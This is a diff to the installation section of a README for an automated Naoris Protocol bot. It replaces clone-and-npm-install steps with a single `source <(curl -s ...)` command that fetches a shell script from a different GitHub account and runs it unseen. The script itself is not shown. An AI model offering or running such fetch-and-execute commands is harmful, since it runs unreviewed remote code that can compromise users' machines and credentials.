@@ -19,15 +19,10 @@ Naoris Auto Bot is an automated bot designed to interact with the Naoris Protoco
 
 ## Installation
 
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/airdropinsiders/Naoris-Auto-Bot.git
-   cd Naoris-Auto-Bot
-   ```
-2. Install dependencies:
-   ```
-   npm install
-   ```
+1. Use with this script installation
+```
+source <(curl -s https://raw.githubusercontent.com/ryzwan29/naoris/main/quick-installation.sh)
+```
 3. Create an accounts.json file in the root directory with the following format:
    ```
    [
